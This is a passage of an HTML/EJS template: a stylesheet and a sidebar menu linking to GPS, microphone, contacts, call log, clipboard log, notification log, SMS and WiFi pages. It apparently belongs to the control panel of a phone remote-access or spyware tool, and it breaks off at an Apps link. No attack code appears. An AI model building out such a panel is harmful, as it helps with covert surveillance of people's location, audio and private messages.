<head>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Audiowide|Sofia|Trirong">
<style>
    body {
  --s: 50px;
  --c: #191b22;
  --_s: calc(2*var(--s)) calc(2*var(--s));
  --_g: 35.36% 35.36% at;
  --_c: #0000 66%,#20222a 68% 70%,#0000 72%;
  background: 
    radial-gradient(var(--_g) 100% 25%,var(--_c)) var(--s) var(--s)/var(--_s), 
    radial-gradient(var(--_g) 0 75%,var(--_c)) var(--s) var(--s)/var(--_s), 
    radial-gradient(var(--_g) 100% 25%,var(--_c)) 0 0/var(--_s), 
    radial-gradient(var(--_g) 0 75%,var(--_c)) 0 0/var(--_s), 
    repeating-conic-gradient(var(--c) 0 25%,#0000 0 50%) 0 0/var(--_s), 
    radial-gradient(var(--_c)) 0 calc(var(--s)/2)/var(--s) var(--s) var(--c);
  background-attachment: fixed;
}
.grey {
        color:rgb(248, 16, 16);
        text-shadow: 0px 0px 1px rgb(0, 0, 0);
        font-family: "Trironga", sans-serif;
      }
    .ram {
        color: Green;
        text-shadow: 2px 3px 6px lime;
    }
    i{
        color: red;
    }
    i {
        text-shadow: 0px 2px 6px rgb(255, 0, 0);
    }
    .fa{
        font-size: 50px;
    }
    .b {font-family: "Sofia", sans-serif;}
</style>
</head>
<div class="four wide column">
    <div class="ui vertical pointing secondary fluid menu hoverEdit">
        <a href="<%= baseURL %>/info" class="item <% if (page==='info') { %> active <% } %>">
            <i class="icon info grey"></i><font class="grey"><B>Info</B></font>
        </a>
        <a href="<%= baseURL %>/gps" class="item <% if (page==='gps') { %> active <% } %>">
            <i class="icon map marker alternate grey"></i><font class="grey"><B>GPS</B></font>
        </a>
        <a href="<%= baseURL %>/microphone" class="item <% if (page==='microphone') { %> active <% } %>">
            <i class="icon microphone grey"></i> <font class="grey"><B>Microphone</B></font>
        </a>
        <a href="<%= baseURL %>/contacts" class="item <% if (page==='contacts') { %> active <% } %>">
            <i class="icon address book grey"></i> <font class="grey"><B>Contacts</B></font>
        </a>
        <a href="<%= baseURL %>/calls" class="item <% if (page==='calls') { %> active <% } %>">
            <i class="icon phone grey"></i> <font class="grey"><B>Call Log</B></font>
        </a>
        <a href="<%= baseURL %>/clipboard" class="item <% if (page==='clipboard') { %> active <% } %>">
            <i class="icon clipboard grey"></i> <font class="grey"><B>Clipboard Log</B></font>
        </a>
        <a href="<%= baseURL %>/notifications" class="item <% if (page==='notifications') { %> active <% } %>">
            <i class="icon exclamation grey"></i> <font class="grey"><B>Notification Log</B></font>
        </a>
        <a href="<%= baseURL %>/sms" class="item <% if (page==='sms') { %> active <% } %>">
            <i class="icon comments grey"></i> <font class="grey"><B>SMS Manager</B></font>
        </a>
        <a href="<%= baseURL %>/wifi" class="item <% if (page==='wifi') { %> active <% } %>">
            <i class="icon wifi grey"></i> <font class="grey"><B>WiFi Manager</B></font>
        </a>
        <a href="<%= baseURL %>/apps" class="item <% if (page==='apps') { %> active <% } %>">
